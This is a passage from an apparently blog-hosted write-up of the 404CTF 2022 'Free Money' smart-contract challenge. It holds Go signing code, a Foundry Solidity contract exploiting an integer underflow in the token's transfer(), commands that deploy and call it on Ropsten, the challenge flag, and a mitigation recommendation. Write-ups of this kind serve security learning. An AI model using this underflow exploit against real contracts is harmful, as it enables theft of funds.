</span></span><span class=line><span class=cl>	<span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>instance</span><span class=p>.</span><span class=nf>EnterHallebarde</span><span class=p>(</span><span class=nx>auth</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=s>&#34;fail to enterHallebarde&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// newTransactor creates a transaction signer based on the provided private key
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=nf>newTransactor</span><span class=p>(</span><span class=nx>client</span> <span class=o>*</span><span class=nx>ethclient</span><span class=p>.</span><span class=nx>Client</span><span class=p>,</span> <span class=nx>privateKeyStr</span> <span class=kt>string</span><span class=p>)</span> <span class=o>*</span><span class=nx>bind</span><span class=p>.</span><span class=nx>TransactOpts</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>privateKey</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>crypto</span><span class=p>.</span><span class=nf>HexToECDSA</span><span class=p>(</span><span class=nx>privateKeyStr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>publicKey</span> <span class=o>:=</span> <span class=nx>privateKey</span><span class=p>.</span><span class=nf>Public</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=nx>publicKeyECDSA</span><span class=p>,</span> <span class=nx>ok</span> <span class=o>:=</span> <span class=nx>publicKey</span><span class=p>.(</span><span class=o>*</span><span class=nx>ecdsa</span><span class=p>.</span><span class=nx>PublicKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>!</span><span class=nx>ok</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=s>&#34;cannot assert type: publicKey is not of type *ecdsa.PublicKey&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>fromAddress</span> <span class=o>:=</span> <span class=nx>crypto</span><span class=p>.</span><span class=nf>PubkeyToAddress</span><span class=p>(</span><span class=o>*</span><span class=nx>publicKeyECDSA</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>nonce</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>client</span><span class=p>.</span><span class=nf>PendingNonceAt</span><span class=p>(</span><span class=nx>context</span><span class=p>.</span><span class=nf>Background</span><span class=p>(),</span> <span class=nx>fromAddress</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>gasPrice</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>client</span><span class=p>.</span><span class=nf>SuggestGasPrice</span><span class=p>(</span><span class=nx>context</span><span class=p>.</span><span class=nf>Background</span><span class=p>())</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=c1>//fmt.Println(&#34;gasPrice:&#34;, gasPrice)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fmt.Println(&#34;nonce:&#34;, nonce)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span> <span class=o>:=</span> <span class=nx>bind</span><span class=p>.</span><span class=nf>NewKeyedTransactor</span><span class=p>(</span><span class=nx>privateKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>auth</span><span class=p>.</span><span class=nx>Nonce</span> <span class=p>=</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=nb>int64</span><span class=p>(</span><span class=nx>nonce</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nx>auth</span><span class=p>.</span><span class=nx>Value</span> <span class=p>=</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>                                <span class=c1>// in wei
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span><span class=p>.</span><span class=nx>GasLimit</span> <span class=p>=</span> <span class=nb>uint64</span><span class=p>(</span><span class=mi>20000000</span><span class=p>)</span>                          <span class=c1>// in units
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>auth</span><span class=p>.</span><span class=nx>GasPrice</span> <span class=p>=</span> <span class=nb>new</span><span class=p>(</span><span class=nx>big</span><span class=p>.</span><span class=nx>Int</span><span class=p>).</span><span class=nf>Mul</span><span class=p>(</span><span class=nx>gasPrice</span><span class=p>,</span> <span class=nx>big</span><span class=p>.</span><span class=nf>NewInt</span><span class=p>(</span><span class=mi>3</span><span class=p>))</span> <span class=c1>// Increase gaz to improve speed as our guess depend of the block number
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>return</span> <span class=nx>auth</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Running the code should generate a revert with the message <strong>Soyez plus entreprenant !</strong>. This means, that we passed the first check that was <code>require(balances[msg.sender] > 100 ether || boss == msg.sender, "Vous n'avez pas assez d'argent pour devenir membre de Hallebarde.");</code>.</p><h3 id=second-condition>Second condition</h3><p>To bypass this check, we need to understand <strong>tx.origin</strong> and <strong>msg.sender</strong>. According to the <a href=https://ethereum.org/en/whitepaper/#ethereum-accounts target=_blank rel="noopener noreffer">ethereum whitepaper</a>:</p><blockquote><p>In general, there are <strong>two types of accounts</strong>: <strong>externally owned accounts</strong>, controlled by private keys, and <strong>contract accounts</strong>, controlled by their contract code.</p></blockquote><ul><li><strong>tx.origin</strong> is the address of the <strong>externally owned accounts</strong> (or a wallet) that sent the transaction.</li><li><strong>msg.sender</strong> is the address of the account from which the call originated. It can be either an <strong>externally owned account</strong> or a <strong>contract account</strong>.</li></ul><p>By analogy with network address, <strong>tx.origin</strong> is like an IP address and <strong>msg.sender</strong> is like an <strong>arp address</strong>.</p><p>Thus, the condition <code>msg.sender != tx.origin</code> means that the transaction must come from a contract account. Basically, we have to do the previous part written in Golang in Solidity. :smile:.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// The interface defining the function in the vulnerable contract that we want to call
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>interface</span> <span class=nc>IFREE_MONEY</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>enterHallebarde</span><span class=p>()</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>receiver</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>getMoney</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>getMembershipStatus</span><span class=p>(</span><span class=kt>address</span> <span class=n>memberAddress</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>ContractTest</span> <span class=k>is</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// The target contract
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>address</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>FREE_MONEY_CONTRACT</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// setUp is a foundry function that is not needed here
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>setUp</span><span class=p>()</span> <span class=k>public</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>freeMoneyPwn</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>IFREE_MONEY</span> <span class=n>fm</span> <span class=o>=</span> <span class=n>IFREE_MONEY</span><span class=p>(</span><span class=n>FREE_MONEY_CONTRACT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Call getMoney with 1 wei
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>fm</span><span class=p>.</span><span class=n>getMoney</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Transfer 2 wei to a random address to trigger the underflow vulnerability
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>fm</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=mh>0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// EnterHallebarde
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>fm</span><span class=p>.</span><span class=n>enterHallebarde</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Check if we are a member, otherwise revert
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nb>require</span><span class=p>(</span><span class=n>fm</span><span class=p>.</span><span class=n>getMembershipStatus</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)),</span> <span class=s>&#34;Not in membership&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>I use <a href=https://github.com/foundry-rs/foundry target=_blank rel="noopener noreffer">Foundry</a> introduce in the post <a href=../setting-up-the-environment/ rel>Setting up the environment</a>.</p><p>The above code can be tested on the fork with the command forge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>forge run test/FreeMoney.t.sol --fork-url http://127.0.0.1:8545 --sig <span class=s2>&#34;freeMoneyPwn()&#34;</span> -vvvv
</span></span></code></pre></td></tr></table></div></div><p>No errors are returned. We can now deploy it on ropsten.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>forge create --rpc-url https://ropsten.infura.io/v3/&lt;API KEY&gt; --private-key &lt;PRIVATE KEY&gt; test/FreeMoney.t.sol:ContractTest
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span><span class=o>]</span> Compiling...
</span></span><span class=line><span class=cl><span class=o>[</span><span class=o>]</span> Compiling <span class=m>2</span> files with 0.8.13
</span></span><span class=line><span class=cl><span class=o>[</span><span class=o>]</span> Compiling <span class=m>2</span> files with 0.6.12
</span></span><span class=line><span class=cl><span class=o>[</span><span class=o>]</span> Solc 0.6.12 finished in 155.95ms
</span></span><span class=line><span class=cl><span class=o>[</span><span class=o>]</span> Solc 0.8.13 finished in 2.56s
</span></span><span class=line><span class=cl>Compiler run successful
</span></span><span class=line><span class=cl>Deployer: 0xbafe3de2e4fbd28ce3d71db73b429cf13359f9e8
</span></span><span class=line><span class=cl>Deployed to: 0xbd5a2d122e606ba8e291db4da69fe879fed767e6
</span></span><span class=line><span class=cl>Transaction hash: 0xaf1231b3a5144264ac530f5409a5c68ce624c925792469ac29ee027893a66bcf
</span></span></code></pre></td></tr></table></div></div><p>And we can call the <code>freeMoneyPwn()</code> function:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cast send 0xbd5a2d122e606ba8e291db4da69fe879fed767e6 <span class=s2>&#34;freeMoneyPwn()&#34;</span> --rpc-url https://ropsten.infura.io/v3/&lt;API KEY&gt;  --private-key &lt;PRIVATE KEY&gt;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>blockHash               0xfed145a41b6b0980fac1c04792951c68b800efcbb837eae7365fc8d87ee37a67
</span></span><span class=line><span class=cl>blockNumber             12281762
</span></span><span class=line><span class=cl>contractAddress
</span></span><span class=line><span class=cl>cumulativeGasUsed       833921
</span></span><span class=line><span class=cl>effectiveGasPrice       3000130589
</span></span><span class=line><span class=cl>gasUsed                 116832
</span></span><span class=line><span class=cl>logs                    []
</span></span><span class=line><span class=cl>logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>status                  1
</span></span><span class=line><span class=cl>transactionHash         0x3f26d603dc17454bd0fa0eb47c120b0e402c526ab1cda862694b53ea53f797ba
</span></span><span class=line><span class=cl>transactionIndex        6
</span></span><span class=line><span class=cl>type                    2
</span></span></code></pre></td></tr></table></div></div><p>We can use the contract address to validate the challenge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>nc challenge.404ctf.fr 30885
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Si vous tes un membre, appuyez sur entre. Si vous tes un VIP, rentrez votre pass :
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nous allons maintenant vrifier que vous tes bien un membre.
</span></span><span class=line><span class=cl>Veuillez rentrer l&#39;adresse ethereum avec laquelle vous tes membre :
</span></span><span class=line><span class=cl>0xbd5a2d122e606ba8e291db4da69fe879fed767e6
</span></span><span class=line><span class=cl>Vrification en cours ...
</span></span><span class=line><span class=cl>Bonjour membre, voici la preuve dfinitive que vous faites partie de Hallebarde :
</span></span><span class=line><span class=cl>404CTF{5M4r7_C0N7r4C7_1NC3P710N_37_UND3rF10W_QU01_D3_P1U5_F4C113}
</span></span><span class=line><span class=cl>Faites attention, elle ne vous sera dlivre qu&#39;une fois, ne la perdez pas !
</span></span></code></pre></td></tr></table></div></div><p>The golang part was not necessary, but I wanted to show you how to use <strong>golang</strong> to interact with the contract.</p><h2 id=recommendation>Recommendation</h2><p>To avoid such vulnerabilities, the safeMath library or the 0.8 branch of the solidity compiler should be used and the <code>transfer()</code> function should implement the appropriate <code>require</code> function.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-01-26</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/foundry/>Foundry</a>,&nbsp;<a href=/tags/solidity/>solidity</a>,&nbsp;<a href=/tags/golang/>golang</a>,&nbsp;<a href=/tags/web3/>Web3</a>,&nbsp;<a href=/tags/ctf/>CTF</a>,&nbsp;<a href=/tags/404ctf/>404CTF</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/writeup-404ctf-22/contractswar2/ class=prev rel=prev title="Writeup 404CTF 2022 - Contracts war 2 (web3)"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Writeup 404CTF 2022 - Contracts war 2 (web3)</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.119.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/lightgallery/css/lightgallery-bundle.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:500},comment:{},lightgallery:!0,search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>